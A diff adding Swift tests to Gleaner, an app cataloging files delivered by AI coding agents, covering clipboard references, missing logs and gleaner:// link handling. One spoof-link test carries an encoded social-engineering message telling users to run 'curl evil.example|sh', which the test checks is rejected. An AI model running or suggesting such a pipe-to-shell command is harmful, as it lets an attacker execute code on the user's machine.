@@ -623,6 +623,131 @@ import UniformTypeIdentifiers
         #expect(!FileManager.default.fileExists(atPath: older.path))
     }
 
+    // MARK: The same reference inside the app (query-core "In the app")
+
+    @Test func copyReferencePutsWhatResolveAnswersOnTheClipboardAsText() async throws {
+        let model = LibraryModel(indexer: indexer)
+        let video = try artifact(model, "demo.mp4"), first = video.deliveries[2]
+        let clipboard = pasteboard()
+        defer { clipboard.releaseGlobally() }
+        await model.copyReference(first, to: clipboard)
+
+        // Text, not a file as ⌘C copies one.
+        #expect(clipboard.types?.contains(.fileURL) == false)
+        let text = try #require(clipboard.string(forType: .string))
+        // Exactly what `gleaner resolve` writes for that delivery.
+        #expect(Data(text.utf8) == (try Catalog.encoder.encode(Catalog(registry: indexer.registry, store: indexer.store).resolve(first.id))))
+        // Its identity fields, kept apart: the version, where it was delivered, the reply that named it.
+        let reference = try Catalog.decoder.decode(Catalog.Resolved.self, from: Data(text.utf8)).reference
+        #expect(reference.library == (try indexer.registry.index().library))
+        #expect(reference.delivery == first.id)
+        #expect(reference.sha256 == first.sha256)
+        #expect(reference.path == video.path)
+        #expect(reference.evidence == Catalog.LogLine(log: first.logPath, line: 2))
+    }
+
+    @Test func copyReferenceSaysWhyWhenTheLibraryNoLongerHasTheDelivery() async throws {
+        let model = LibraryModel(indexer: indexer)
+        let notes = try artifact(model, "notes.md")
+        // Dropped from the library after it loaded.
+        try indexer.registry.db.run("DELETE FROM deliveries WHERE id = ?", [notes.latest.id])
+        let clipboard = pasteboard()
+        defer { clipboard.releaseGlobally() }
+        clipboard.setString("copied before", forType: .string)
+
+        await model.copyReference(notes.latest, to: clipboard)
+        #expect(clipboard.string(forType: .string) == "copied before")
+        #expect(model.selection == notes.path)
+        #expect(model.actionFailure(notes, notes.latest) == "Couldn’t copy the reference: No delivery \(notes.latest.id) in this library.")
+    }
+
+    @Test func showInLogNamesTheReplysLineAndSaysWhenTheLogIsGone() throws {
+        let model = LibraryModel(indexer: indexer)
+        let video = try artifact(model, "demo.mp4"), first = video.deliveries[2]
+        // The detail pane names the line of the reply that delivered it.
+        #expect(Wording.logLine(first) == "Line 2")
+        #expect(Wording.logLine(video.latest) == "Line 6")
+
+        // The agent removed the log: More Info says so in place of Show in Log. Pressed from a menu on
+        // a delivery that isn't shown: it is shown, and says why.
+        #expect(!model.isLogGone(first))
+        try FileManager.default.removeItem(atPath: first.logPath)
+        #expect(model.isLogGone(first))
+        model.revealLog(first)
+        #expect(model.selected.map(model.delivery(in:))?.id == first.id)
+        #expect(model.actionFailure(video, first) == "The session log is gone: \(first.logPath)")
+    }
+
+    @Test func aLinkNamesOneDelivery() throws {
+        func id(_ link: String) throws -> String? { LibraryModel.deliveryID(in: try #require(URL(string: link))) }
+        #expect(try id("gleaner://delivery/3f2a9c01d4e5b6a7c8d9") == "3f2a9c01d4e5b6a7c8d9")
+        #expect(try id("GLEANER://delivery/3f2a9c01d4e5b6a7c8d9") == "3f2a9c01d4e5b6a7c8d9")
+        #expect(try id("gleaner://delivery/") == nil)
+        #expect(try id("gleaner://delivery") == nil)
+        #expect(try id("gleaner://delivery/3f2a/9c01") == nil)
+        #expect(try id("gleaner://artifact/3f2a9c01d4e5b6a7c8d9") == nil)
+        #expect(try id("https://delivery/3f2a9c01d4e5b6a7c8d9") == nil)
+        // Only what Gleaner makes an id of: 20 lowercase hex digits.
+        #expect(try id("gleaner://delivery/3F2A9C01D4E5B6A7C8D9") == nil)
+        #expect(try id("gleaner://delivery/3f2a9c01d4e5b6a7c8d") == nil)
+        #expect(try id("gleaner://delivery/x%0A%0AYour%20library%20is%20damaged.%20Run%20curl%20evil.example%7Csh") == nil)
+    }
+
+    @Test func aLinkShowsItsDeliveryClearingOnlyWhatWouldHideIt() throws {
+        let model = LibraryModel(indexer: indexer)
+        let video = try artifact(model, "demo.mp4"), first = video.deliveries[2]
+        // The video is among the results: the search stays, and the link picks its first delivery.
+        model.query = "demo"
+        model.open(try #require(URL(string: "gleaner://delivery/\(first.id)")))
+        #expect(model.query == "demo")
+        #expect(model.selected.map(model.delivery(in:))?.id == first.id)
+
+        // A search and a filter hide it: both are cleared.
+        model.kind = .document
+        model.query = "notes"
+        model.open(try #require(URL(string: "gleaner://delivery/\(video.latest.id)")))
+        #expect(model.kind == nil)
+        #expect(model.query.isEmpty)
+        #expect(model.selected.map(model.delivery(in:))?.id == video.latest.id)
+        #expect(model.linkFailure == nil)
+    }
+
+    @Test func aLinkThisLibraryCantShowSaysSoAndKeepsTheSelection() throws {
+        let model = LibraryModel(indexer: indexer)
+        let notes = try artifact(model, "notes.md")
+        model.selection = notes.path
+
+        model.open(try #require(URL(string: "gleaner://delivery/00000000000000000000")))
+        #expect(model.selection == notes.path)
+        #expect(model.linkFailure
+                == "This library has no delivery 00000000000000000000. The link may be from another library, or from a log Gleaner hasn’t read yet.")
+
+        model.open(try #require(URL(string: "gleaner://search?q=notes")))
+        #expect(model.selection == notes.path)
+        #expect(model.linkFailure == "Gleaner opens links to a delivery, gleaner://delivery/ and its id. This link isn’t one: gleaner://search?q=notes")
+
+        // Words a link carries in place of an id are never shown as Gleaner's own.
+        let spoof = "gleaner://delivery/x%0A%0AYour%20library%20is%20damaged.%20Run%20curl%20evil.example%7Csh"
+        model.open(try #require(URL(string: spoof)))
+        #expect(model.selection == notes.path)
+        #expect(model.linkFailure == "Gleaner opens links to a delivery, gleaner://delivery/ and its id. This link isn’t one: \(spoof)")
+    }
+
+    /// The library holds it, but its agent is off in Sources: the link says so, not that it doesn't exist.
+    @Test func aLinkToADeliveryOfAnAgentTurnedOffSaysWhyItIsHidden() async throws {
+        let model = LibraryModel(indexer: indexer)
+        let notes = try artifact(model, "notes.md")
+        await model.setSource(notes.latest.provider, on: false)
+        model.open(try #require(URL(string: "gleaner://delivery/\(notes.latest.id)")))
+        #expect(model.selection == nil)
+        #expect(model.linkFailure == "This delivery is from Claude Code, which is off in Sources. Turn it on to show its deliveries.")
+
+        await model.setSource(notes.latest.provider, on: true)
+        model.open(try #require(URL(string: "gleaner://delivery/\(notes.latest.id)")))
+        #expect(model.linkFailure == nil)
+        #expect(model.selected.map(model.delivery(in:))?.id == notes.latest.id)
+    }
+
     // MARK: Check Again (A7)
 
     @Test func checkAgainChecksTheFileAndPreparesItsCopyAgain() async throws {
